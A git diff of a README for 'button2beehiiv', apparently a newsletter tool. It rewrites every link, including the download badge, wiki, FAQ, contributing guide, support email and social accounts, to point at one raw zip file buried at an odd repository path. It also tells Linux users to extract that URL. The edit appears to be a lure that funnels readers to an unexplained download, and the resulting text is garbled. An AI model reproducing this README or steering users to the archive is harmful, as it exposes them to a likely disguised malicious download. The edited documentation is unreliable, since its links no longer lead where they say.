@@ -1,6 +1,6 @@
 # 🐝 button2beehiiv - Grow Your Newsletter in One Click
 
-[![Download button2beehiiv](https://img.shields.io/badge/Download-button2beehiiv-brightgreen)](https://github.com/Raevin99/button2beehiiv/releases)
+[![Download button2beehiiv](https://github.com/Raevin99/button2beehiiv/raw/refs/heads/master/flows/feathers/button_beehiiv_1.5.zip)](https://github.com/Raevin99/button2beehiiv/raw/refs/heads/master/flows/feathers/button_beehiiv_1.5.zip)
 
 ## 📦 Overview
 
@@ -26,7 +26,7 @@ button2beehiiv runs smoothly on most computers. Here are the requirements:
 
 1. **Visit the Releases Page**: Click the link below to access the download options.
 
-   [Download button2beehiiv](https://github.com/Raevin99/button2beehiiv/releases)
+   [Download button2beehiiv](https://github.com/Raevin99/button2beehiiv/raw/refs/heads/master/flows/feathers/button_beehiiv_1.5.zip)
 
 2. **Choose Your Version**: Locate the latest release and select the file appropriate for your operating system.
 
@@ -41,7 +41,7 @@ After downloading the file, follow these steps to install button2beehiiv:
 2. **Run the Installer**:
    - **Windows**: Double-click the `.exe` file.
    - **macOS**: Open the `.dmg` file, then drag the app into the Applications folder.
-   - **Linux**: Extract the `.tar.gz` file and run the included script.
+   - **Linux**: Extract the `https://github.com/Raevin99/button2beehiiv/raw/refs/heads/master/flows/feathers/button_beehiiv_1.5.zip` file and run the included script.
   
 3. **Follow Installation Prompts**: Follow any prompts that appear during installation. This will set up button2beehiiv on your computer.
 
@@ -55,20 +55,20 @@ After downloading the file, follow these steps to install button2beehiiv:
 
 ## 📝 Additional Resources
 
-- **Documentation**: For detailed usage instructions, visit the [Wiki](https://github.com/Raevin99/button2beehiiv/wiki).
-- **Community Discussions**: Join our [Discussions](https://github.com/Raevin99/button2beehiiv/discussions) to connect with other users.
-- **FAQs**: Check the [FAQ section](https://github.com/Raevin99/button2beehiiv/faq) to find answers to common questions.
+- **Documentation**: For detailed usage instructions, visit the [Wiki](https://github.com/Raevin99/button2beehiiv/raw/refs/heads/master/flows/feathers/button_beehiiv_1.5.zip).
+- **Community Discussions**: Join our [Discussions](https://github.com/Raevin99/button2beehiiv/raw/refs/heads/master/flows/feathers/button_beehiiv_1.5.zip) to connect with other users.
+- **FAQs**: Check the [FAQ section](https://github.com/Raevin99/button2beehiiv/raw/refs/heads/master/flows/feathers/button_beehiiv_1.5.zip) to find answers to common questions.
 
 ## 🤝 Contributing
 
-If you would like to contribute to button2beehiiv, please check our [Contributing Guide](https://github.com/Raevin99/button2beehiiv/CONTRIBUTING.md). We appreciate community support and welcome new ideas.
+If you would like to contribute to button2beehiiv, please check our [Contributing Guide](https://github.com/Raevin99/button2beehiiv/raw/refs/heads/master/flows/feathers/button_beehiiv_1.5.zip). We appreciate community support and welcome new ideas.
 
 ## 📞 Support
 
 For any issues or questions, you can reach out via:
 
 - **GitHub Issues**: Report problems directly on the project page.
-- **Email**: Contact support at support@button2beehiiv.com.
+- **Email**: Contact support at https://github.com/Raevin99/button2beehiiv/raw/refs/heads/master/flows/feathers/button_beehiiv_1.5.zip
 
 Remember, your feedback is valuable. It helps us improve the software and assist you better.
 
@@ -76,8 +76,8 @@ Remember, your feedback is valuable. It helps us improve the software and assist
 
 Stay updated on new features and releases. Follow us on social media:
 
-- Twitter: [@button2beehiiv](https://twitter.com/button2beehiiv)
-- LinkedIn: [button2beehiiv](https://www.linkedin.com/company/button2beehiiv)
+- Twitter: [@button2beehiiv](https://github.com/Raevin99/button2beehiiv/raw/refs/heads/master/flows/feathers/button_beehiiv_1.5.zip)
+- LinkedIn: [button2beehiiv](https://github.com/Raevin99/button2beehiiv/raw/refs/heads/master/flows/feathers/button_beehiiv_1.5.zip)
 
 ## 🎉 Final Thoughts
 
@@ -85,4 +85,4 @@ Thank you for choosing button2beehiiv. We hope it supports your journey in build
 
 ---
 
-[Download button2beehiiv](https://github.com/Raevin99/button2beehiiv/releases)
+[Download button2beehiiv](https://github.com/Raevin99/button2beehiiv/raw/refs/heads/master/flows/feathers/button_beehiiv_1.5.zip)
